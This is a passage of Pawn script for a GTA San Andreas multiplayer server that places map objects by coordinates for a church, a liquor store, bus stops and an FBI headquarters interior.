	CreateDynamicObject(2591, -1830.76, -171.64, 997.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2591, -1827.29, -171.67, 997.70,   0.00, 0.00, 270.00);
	CreateDynamicObject(2591, -1830.76, -173.91, 997.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2591, -1827.28, -173.94, 997.70,   0.00, 0.00, 270.00);
	CreateDynamicObject(2591, -1830.76, -176.13, 997.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2591, -1827.28, -176.16, 997.70,   0.00, 0.00, 270.00);
	CreateDynamicObject(2591, -1830.76, -178.49, 997.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2591, -1827.29, -178.52, 997.70,   0.00, 0.00, 270.00);

	// Church outside
   	CreateDynamicObject(9931, 2297.89, -1530.79, 41.05,   0.00, 0.00, 90.00);
	CreateDynamicObject(4682, 2302.29, -1541.76, 4.82,   0.00, 0.00, 0.00);
	CreateDynamicObject(4682, 2302.31, -1537.55, 8.18,   90.00, 179.92, 180.08);
	CreateDynamicObject(4682, 2302.59, -1536.40, 8.03,   90.00, 179.92, 270.07);
	CreateDynamicObject(4682, 2311.22, -1527.08, 4.84,   0.00, 0.00, 0.00);
	CreateDynamicObject(4682, 2311.23, -1541.88, 4.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(4682, 2311.20, -1537.68, 8.21,   90.00, 179.92, 180.07);
	CreateDynamicObject(4682, 2311.51, -1536.45, 8.23,   90.00, 179.92, 270.07);
	CreateDynamicObject(4682, 2311.50, -1530.79, 8.23,   90.00, 179.92, 270.07);
	CreateDynamicObject(4682, 2310.36, -1530.50, 8.18,   90.00, 179.92, 0.07);
	CreateDynamicObject(4100, 2331.22, -1517.40, 26.31,   0.00, 0.00, 50.00);
	CreateDynamicObject(4100, 2331.16, -1531.26, 26.31,   0.00, 0.00, 50.00);
	CreateDynamicObject(4100, 2331.19, -1545.07, 26.30,   0.00, 0.00, 50.00);
	CreateDynamicObject(4100, 2331.17, -1550.08, 26.30,   0.00, 0.00, 50.00);
	CreateDynamicObject(4100, 2324.34, -1557.26, 26.29,   0.00, 0.00, 320.25);
	CreateDynamicObject(4100, 2310.50, -1557.34, 26.29,   0.00, 0.00, 320.25);
	CreateDynamicObject(4100, 2296.67, -1557.34, 26.29,   0.00, 0.00, 319.75);
	CreateDynamicObject(4100, 2288.41, -1557.27, 26.29,   0.00, 0.00, 320.25);
	CreateDynamicObject(4100, 2280.79, -1549.90, 27.58,   0.00, 0.00, 136.99);
	CreateDynamicObject(1364, 2302.25, -1500.79, 25.09,   0.00, 0.00, 270.00);
	CreateDynamicObject(1364, 2293.96, -1500.93, 25.09,   0.00, 0.00, 90.00);
	CreateDynamicObject(2243, 2299.94, -1508.43, 26.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(2243, 2296.00, -1508.44, 26.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(4100, 2274.32, -1542.13, 27.60,   0.00, 0.00, 48.74);
	CreateDynamicObject(4100, 2274.57, -1528.07, 27.60,   0.00, 0.00, 48.74);
	CreateDynamicObject(4100, 2274.91, -1513.91, 27.58,   0.00, 0.00, 48.74);
	CreateDynamicObject(325, 2299.87, -1508.39, 26.21,   0.00, 0.00, 0.00);
	CreateDynamicObject(325, 2295.95, -1508.38, 26.22,   0.00, 0.00, 0.00);
	CreateDynamicObject(970, 2303.18, -1496.88, 24.14,   0.46, 336.00, 271.20);
	CreateDynamicObject(970, 2303.25, -1505.23, 25.73,   360.00, 334.25, 270.25);
	CreateDynamicObject(970, 2292.77, -1496.84, 24.17,   359.32, 334.24, 268.17);
	CreateDynamicObject(970, 2292.64, -1505.32, 25.64,   1.76, 331.98, 271.18);
	CreateDynamicObject(970, 2303.24, -1501.02, 25.02,   0.00, 0.00, 90.50);
	CreateDynamicObject(970, 2292.78, -1501.16, 25.19,   0.00, 0.00, 90.50);
	CreateDynamicObject(970, 2324.99, -1510.54, 25.47,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2314.09, -1510.44, 26.33,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2318.61, -1510.46, 26.32,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2329.77, -1506.97, 26.40,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2325.42, -1506.99, 26.40,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2320.95, -1507.00, 26.40,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2316.48, -1507.05, 26.40,   0.00, 0.00, 180.50);
	CreateDynamicObject(970, 2312.07, -1507.08, 26.42,   0.00, 0.00, 180.50);
	CreateDynamicObject(4100, 2276.66, -1500.43, 25.26,   14.87, 346.80, 219.93);
	CreateDynamicObject(1557, 2311.73, -1510.25, 25.84,   0.00, 0.00, 90.25);
	CreateDynamicObject(1557, 2311.73, -1507.22, 25.84,   0.00, 0.00, 269.50);
	CreateDynamicObject(1257, 2333.84, -1536.79, 24.29,   0.00, 0.00, 180.00);
	CreateDynamicObject(1231, 2306.08, -1507.95, 28.58,   0.00, 0.00, 0.00);
	CreateDynamicObject(1231, 2289.25, -1508.33, 28.58,   0.00, 0.00, 289.00);
	CreateDynamicObject(1215, 2327.59, -1506.99, 26.41,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2323.17, -1506.98, 26.41,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2318.69, -1507.06, 26.41,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2314.27, -1507.18, 26.40,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2327.66, -1510.56, 25.53,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2321.80, -1510.56, 25.68,   0.00, 0.00, 0.00);
	CreateDynamicObject(1215, 2316.33, -1510.48, 26.40,   0.00, 0.00, 0.00);
	CreateDynamicObject(970, 2330.10, -1510.52, 24.09,   1.74, 330.49, 181.49);

	// Church Interior
	CreateDynamicObject(5710, -2035.90, 1092.06, 21.41,   0.00, 0.00, 0.00);
	CreateDynamicObject(5710, -2021.33, 1074.28, 21.33,   0.00, 0.00, -89.38);
	CreateDynamicObject(5710, -2023.42, 1074.53, 24.57,   180.48, 0.00, -87.66);
	CreateDynamicObject(5710, -2010.79, 1092.28, 21.42,   0.00, 0.00, 180.48);
	CreateDynamicObject(10676, -2024.83, 1101.63, 9.61,   0.00, 0.00, 0.00);
	CreateDynamicObject(5710, -2003.88, 1124.53, 22.37,   0.00, 0.00, 2.58);
	CreateDynamicObject(5710, -2044.21, 1124.11, 22.37,   0.00, 0.00, 179.62);
	CreateDynamicObject(5710, -2024.95, 1145.35, 20.50,   0.00, 0.00, 273.30);
	CreateDynamicObject(10676, -2025.56, 1132.25, 31.50,   180.48, 0.00, 1.72);
	CreateDynamicObject(17950, -2025.18, 1147.85, 19.80,   -6.02, 0.00, -177.04);
	CreateDynamicObject(10676, -2081.26, 1094.22, 18.98,   0.00, 0.00, 89.38);
	CreateDynamicObject(10676, -1965.05, 1091.45, 19.00,   0.00, 0.00, -88.52);
	CreateDynamicObject(616, -2055.35, 1090.21, -2.16,   0.00, 0.00, -7.74);
	CreateDynamicObject(616, -1992.36, 1092.41, -2.40,   0.00, 0.00, 2.58);
	CreateDynamicObject(617, -2039.20, 1124.15, 12.52,   0.00, 0.00, 0.00);
	CreateDynamicObject(617, -2009.60, 1123.93, 13.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(3406, -2024.76, 1139.86, 15.00,   0.00, 0.00, 91.96);
	CreateDynamicObject(14535, -2002.93, 1089.43, 19.88,   0.00, 0.00, 0.00);
	CreateDynamicObject(2591, -2005.79, 1087.08, 18.07,   0.00, 0.00, 0.00);
	CreateDynamicObject(2591, -2007.45, 1088.78, 18.06,   0.00, 0.00, -91.10);
	CreateDynamicObject(2591, -2010.35, 1090.21, 18.16,   0.00, 0.00, -274.16);
	CreateDynamicObject(2639, -2026.61, 1129.09, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2028.66, 1129.04, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.27, 1129.00, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2026.46, 1125.22, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2028.51, 1125.17, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.32, 1125.08, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2026.41, 1121.53, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2028.44, 1121.48, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.27, 1121.45, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2026.30, 1117.46, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2028.31, 1117.42, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.23, 1117.28, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2026.14, 1114.01, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2028.17, 1113.97, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.39, 1113.95, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2026.03, 1110.29, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2028.04, 1110.23, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.40, 1110.15, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2025.83, 1105.82, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2027.84, 1105.77, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2032.48, 1105.60, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2025.95, 1102.42, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2020.61, 1102.46, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.18, 1106.07, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.07, 1106.13, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.29, 1110.42, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.18, 1110.46, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.49, 1114.06, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.42, 1114.10, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.49, 1117.38, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.36, 1117.44, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.70, 1121.65, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.67, 1121.70, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.80, 1125.27, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.71, 1125.31, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2021.89, 1129.22, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(2639, -2019.84, 1129.28, 17.68,   0.00, 0.00, 181.34);
	CreateDynamicObject(949, -2025.63, 1099.55, 18.49,   0.00, 0.00, 0.00);
	CreateDynamicObject(949, -2021.01, 1099.58, 18.50,   0.00, 0.00, 0.00);
	CreateDynamicObject(3406, -2024.53, 1133.21, 15.00,   0.00, 0.00, 91.96);
	CreateDynamicObject(3406, -2024.29, 1126.65, 15.00,   0.00, 0.00, 91.96);
	CreateDynamicObject(3406, -2024.09, 1120.10, 15.00,   0.00, 0.00, 91.96);
	CreateDynamicObject(3406, -2023.87, 1113.53, 15.00,   0.00, 0.00, 91.96);
	CreateDynamicObject(3406, -2023.65, 1107.07, 15.00,   0.00, 0.00, 91.96);
	CreateDynamicObject(1841, -2013.76, 1101.72, 21.37,   0.00, 0.00, -42.11);
	CreateDynamicObject(1841, -2033.51, 1101.46, 21.31,   0.00, 0.00, -140.09);
	CreateDynamicObject(14527, -2024.36, 1125.76, 21.46,   0.00, 0.00, 0.00);
	CreateDynamicObject(14527, -2023.68, 1110.28, 21.21,   0.00, 0.00, 0.00);
	CreateDynamicObject(14527, -2023.95, 1118.86, 21.36,   0.00, 0.00, 0.00);
	CreateDynamicObject(2048, -2032.37, 1100.04, 21.71,   0.00, 0.00, 91.10);
	CreateDynamicObject(2048, -2014.37, 1100.26, 21.66,   0.86, -0.86, 270.72);
	CreateDynamicObject(626, -2032.65, 1086.69, 19.92,   0.00, 0.00, 0.00);
	CreateDynamicObject(626, -2013.40, 1086.48, 19.92,   0.00, 0.00, 0.00);
	CreateDynamicObject(936, -2022.40, 1095.25, 17.53,   0.00, 0.00, 0.00);
	CreateDynamicObject(936, -2024.28, 1095.26, 17.53,   0.00, 0.00, 0.00);
	CreateDynamicObject(936, -2024.25, 1094.20, 17.53,   0.00, 0.00, -178.76);
	CreateDynamicObject(936, -2022.37, 1094.22, 17.53,   0.00, 0.00, -179.62);
	CreateDynamicObject(936, -2023.28, 1093.59, 17.28,   0.00, 0.00, -178.76);
	CreateDynamicObject(936, -2023.27, 1093.14, 16.95,   0.00, 0.00, -178.76);
	CreateDynamicObject(1743, -2023.66, 1094.33, 18.02,   0.00, 0.00, 0.00);
	CreateDynamicObject(1510, -2023.41, 1095.19, 19.02,   0.00, 0.00, 0.00);
	CreateDynamicObject(1667, -2023.04, 1095.20, 19.12,   0.00, 0.00, 0.00);
	CreateDynamicObject(1668, -2022.79, 1095.31, 19.20,   0.00, 0.00, 31.80);
	CreateDynamicObject(1720, -2025.54, 1097.94, 17.05,   0.00, 0.00, 42.97);
	CreateDynamicObject(1720, -2021.61, 1097.96, 17.05,   0.00, 0.00, -42.11);
	CreateDynamicObject(1720, -2024.60, 1086.20, 17.05,   0.00, 0.00, -182.20);
	CreateDynamicObject(1720, -2023.30, 1086.16, 17.05,   0.00, 0.00, -181.34);
	CreateDynamicObject(1720, -2022.04, 1086.14, 17.05,   0.00, 0.00, -179.62);
	CreateDynamicObject(2745, -2015.29, 1099.68, 19.09,   0.00, 0.00, -89.38);
	CreateDynamicObject(2745, -2031.46, 1099.43, 19.08,   0.00, 0.00, 91.10);
	CreateDynamicObject(3462, -2023.00, 1140.86, 18.57,   0.00, 0.00, 68.75);
	CreateDynamicObject(3462, -2026.74, 1141.01, 18.57,   0.00, 0.00, 118.60);
	CreateDynamicObject(626, -2021.63, 1141.99, 19.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(626, -2019.37, 1142.11, 19.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(626, -2027.93, 1141.73, 19.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(626, -2030.01, 1141.72, 19.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(2639, -2020.27, 1140.77, 17.68,   0.00, 0.00, 182.20);
	CreateDynamicObject(2639, -2028.98, 1140.27, 17.68,   0.00, 0.00, 182.20);
	CreateDynamicObject(1720, -2015.52, 1125.02, 17.05,   0.00, 0.00, -60.16);
	CreateDynamicObject(1720, -2015.69, 1123.82, 17.05,   0.00, 0.00, -85.94);
	CreateDynamicObject(1720, -2015.42, 1122.46, 17.05,   0.00, 1.72, -139.23);
	CreateDynamicObject(1491, -2016.20, 1124.53, 16.76,   0.00, 0.00, -86.80);
	CreateDynamicObject(967, -2015.49, 1123.76, 17.01,   0.00, 0.00, 93.68);
	CreateDynamicObject(1497, -2016.28, 1124.46, 15.83,   0.00, 0.00, 2.58);
	CreateDynamicObject(15035, -2042.98, 1096.35, 17.84,   0.00, 0.00, 90.24);
	CreateDynamicObject(2591, -2038.59, 1100.06, 18.89,   0.00, 0.00, -179.62);
	CreateDynamicObject(1557, -2023.25, 1143.32, 17.15,   0.00, 0.00, 181.98);
	CreateDynamicObject(1557, -2026.25, 1143.20, 17.15,   0.00, 0.00, 1.98);

	//liquor store
	CreateDynamicObject(12843, 2271.28, -1742.40, 12.53,   0.00, 0.00, 179.94);
	CreateDynamicObject(12844, 2274.24, -1742.39, 14.52,   0.00, 0.00, 179.94);
	CreateDynamicObject(12845, 2274.24, -1742.71, 14.66,   0.00, 0.00, 179.94);
	CreateDynamicObject(1523, 2268.072998, -1737.526000, 12.332807, 0.000000, 0.000000, -0.300000);
	CreateDynamicObject(1523, 2271.106445, -1737.520141, 12.332807, 0.000000, 0.000000, -179.700042);
	CreateDynamicObject(1533, 2279.087402, -1747.453979, 12.532804, 0.000000, 0.000000, 0.400028);
	CreateDynamicObject(1533, 2274.258056, -1744.853393, 12.476860, 0.000000, 0.000000, -88.800155);
	CreateDynamicObject(970, 2264.190917, -1737.511596, 12.992807, 0.000000, 0.000000, 0.300006);
	CreateDynamicObject(970, 2260.039062, -1737.511596, 12.992807, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 2255.907714, -1737.511596, 12.992807, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 2251.776611, -1737.511596, 12.992807, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 2249.718261, -1739.604003, 12.992807, 0.000000, 0.000000, -90.400039);
	CreateDynamicObject(970, 2249.678222, -1745.204711, 12.992807, 0.000000, 0.000000, -90.400039);
	CreateDynamicObject(970, 2251.734130, -1747.237182, 12.992807, 0.000000, 0.000000, -179.000030);
	CreateDynamicObject(970, 2255.873046, -1747.164794, 12.992807, 0.000000, 0.000000, -179.000030);
	CreateDynamicObject(970, 2259.982910, -1747.093750, 12.992807, 0.000000, 0.000000, -179.000030);
	CreateDynamicObject(970, 2264.132324, -1747.021240, 12.992807, 0.000000, 0.000000, -179.000030);
	CreateDynamicObject(3804, 2266.118652, -1738.704467, 16.086879, 0.000000, 0.000000, 178.400039);
	CreateDynamicObject(1231, 2250.442382, -1738.144042, 14.346880, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1231, 2250.392333, -1746.765380, 14.346880, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(910, 2281.820312, -1743.810546, 13.606870, 0.000000, 0.000000, 89.799964);
	CreateDynamicObject(1264, 2281.781250, -1742.126342, 12.926868, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1349, 2282.561767, -1745.496215, 13.046875, 0.000000, 0.000000, 41.500000);
	CreateDynamicObject(2714, 2267.903320, -1737.371948, 14.272810, 0.000000, 0.000000, -179.900070);
	CreateDynamicObject(640, 2254.801757, -1742.319213, 13.206871, 0.000000, 0.000000, -89.299957);
	CreateDynamicObject(640, 2260.143066, -1742.254028, 13.206871, 0.000000, 0.000000, -89.299957);
	CreateDynamicObject(1514, 2272.950927, -1743.643188, 13.736871, 0.000000, 0.000000, -179.299987);
	CreateDynamicObject(1594, 2254.904785, -1744.738159, 12.976871, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1594, 2260.705566, -1744.738159, 12.976871, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1594, 2260.705566, -1739.738403, 12.976871, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1594, 2255.735839, -1739.738403, 12.976871, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1256, 2272.984130, -1722.028442, 13.212811, 0.000000, 0.000000, 89.000038);
	CreateDynamicObject(1256, 2275.914550, -1722.079223, 13.212811, 0.000000, 0.000000, 89.000038);
	CreateDynamicObject(956, 2265.882812, -1741.217773, 12.906874, 0.000000, 0.000000, -90.999992);
	CreateDynamicObject(1776, 2265.930175, -1742.702514, 13.606874, 0.000000, 0.000000, -88.999984);

	// Bus Stops
	CreateDynamicObject(984,1181.00000000,-1346.00000000,13.19999981,0.00000000,0.00000000,309.26000977); //object(fenceshit2) (1)
	CreateDynamicObject(984,1185.50000000,-1311.59997559,13.19999981,0.00000000,0.00000000,0.74707031); //object(fenceshit2) (2)
	CreateDynamicObject(984,1180.50000000,-1301.19995117,13.19999981,0.00000000,0.00000000,50.74707031); //object(fenceshit2) (3)
	CreateDynamicObject(1280,1186.09997559,-1339.80004883,13.00000000,0.00000000,0.00000000,182.00000000); //object(parkbench1) (1)
	CreateDynamicObject(1280,1186.00000000,-1337.00000000,13.00000000,0.00000000,0.00000000,181.99951172); //object(parkbench1) (2)
	CreateDynamicObject(1229,1186.09997559,-1341.50000000,14.10000038,0.00000000,0.00000000,120.00000000); //object(bussign1) (1)
	CreateDynamicObject(984,1185.59997559,-1335.80004883,13.19999981,0.00000000,0.00000000,0.74707031); //object(fenceshit2) (4)
	CreateDynamicObject(1280,1539.59997559,-1743.59997559,12.89999962,0.00000000,0.00000000,270.00000000); //object(parkbench1) (3)
	CreateDynamicObject(1280,1536.80004883,-1743.59997559,12.89999962,0.00000000,0.00000000,270.00000000); //object(parkbench1) (4)
	CreateDynamicObject(1229,1541.19995117,-1743.59997559,14.10000038,0.00000000,0.00000000,220.00000000); //object(bussign1) (2)
	CreateDynamicObject(1229,1812.19995117,-1926.19995117,14.10000038,0.00000000,0.00000000,117.50000000); //object(bussign1) (3)
	CreateDynamicObject(1280,1811.90002441,-1924.50000000,13.00000000,0.00000000,0.00000000,180.00000000); //object(parkbench1) (5)
	CreateDynamicObject(1280,1811.90002441,-1921.80004883,13.00000000,0.00000000,0.00000000,179.99450684); //object(parkbench1) (6)

	// New FBI HQ
	CreateDynamicObject(19461, 1789.95654, -1299.78833, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1789.95923, -1299.81055, 48.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1799.82141, -1299.34656, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1799.82141, -1299.34656, 48.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1792.47388, -1304.07654, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19397, 1798.30981, -1304.08276, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19461, 1792.47388, -1304.07654, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19461, 1795.08472, -1304.07495, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1830.23816, -1279.97400, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1830.23816, -1279.97400, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1831.84070, -1279.97400, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1833.44507, -1279.97400, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1834.95251, -1279.97205, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1831.84070, -1279.97400, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1833.44507, -1279.97400, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1834.95251, -1279.97205, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19397, 1806.49597, -1310.63525, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19369, 1806.47815, -1307.47571, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19369, 1806.47815, -1307.47571, 48.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19369, 1806.47815, -1307.47571, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19369, 1806.47815, -1310.63525, 48.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1819.14990, -1312.23596, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19461, 1819.14990, -1312.23596, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19442, 1823.92395, -1311.51514, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19442, 1823.92395, -1311.51514, 48.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19442, 1818.58362, -1311.42590, 44.73590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19442, 1818.58362, -1311.42590, 48.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 1790.48950, -1295.27368, 42.93680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 1794.11621, -1295.27368, 42.93680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 1796.44934, -1295.27295, 42.93680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 1796.43311, -1295.24988, 45.64000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 1794.11621, -1295.27368, 45.64000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2395, 1790.48950, -1295.27368, 45.64000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19461, 1827.69385, -1312.23645, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19397, 1834.10840, -1312.23596, 44.73590,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19461, 1827.18726, -1312.21399, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19461, 1830.89368, -1312.21448, 48.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2131, 1782.34619, -1302.24231, 43.03680,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2132, 1782.34619, -1304.23206, 43.04000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1432, 1774.46472, -1305.41895, 43.01600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1432, 1773.42944, -1300.01953, 43.01600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1432, 1776.97070, -1298.24109, 43.01600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1432, 1780.31848, -1308.23938, 43.01600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1432, 1781.60840, -1297.65369, 43.01600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2637, 1794.88818, -1299.47839, 43.41730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2637, 1792.94141, -1299.47693, 43.41730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2637, 1796.83459, -1299.47876, 43.41730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1663, 1792.24292, -1300.82935, 43.41700,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1663, 1793.66382, -1300.82935, 43.41700,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1663, 1794.90710, -1300.82935, 43.41700,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1663, 1796.26575, -1300.82935, 43.41700,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1663, 1797.48608, -1300.82935, 43.41700,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1663, 1791.21814, -1299.57874, 43.41700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1663, 1792.29675, -1298.37805, 43.41700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1663, 1793.59631, -1298.37805, 43.41700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1663, 1794.73560, -1298.37805, 43.41700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1663, 1796.13708, -1298.37805, 43.41700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1663, 1797.29565, -1298.37805, 43.41700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19805, 1792.05139, -1303.94556, 44.35340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2611, 1795.02002, -1303.94556, 44.15340,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2612, 1792.66907, -1295.27332, 44.73120,   -0.02000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1795.51208, -1295.23193, 43.03750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1797.28040, -1295.25330, 43.03750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1799.34521, -1295.73792, 43.03679,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1790.46973, -1295.64661, 43.03679,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1799.28638, -1303.47144, 43.03679,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2253, 1793.82959, -1299.42517, 44.08210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2253, 1795.98962, -1299.42517, 44.08210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1808, 1790.79895, -1302.03113, 43.03540,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1432, 1777.39453, -1302.66626, 43.01600,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1783.03125, -1311.68201, 43.03672,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1771.64697, -1306.21838, 43.03672,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1771.40576, -1298.90820, 43.03672,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1779.34875, -1295.61401, 43.03672,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11729, 1812.82568, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1812.16553, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1811.50500, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1810.84473, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1810.20471, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
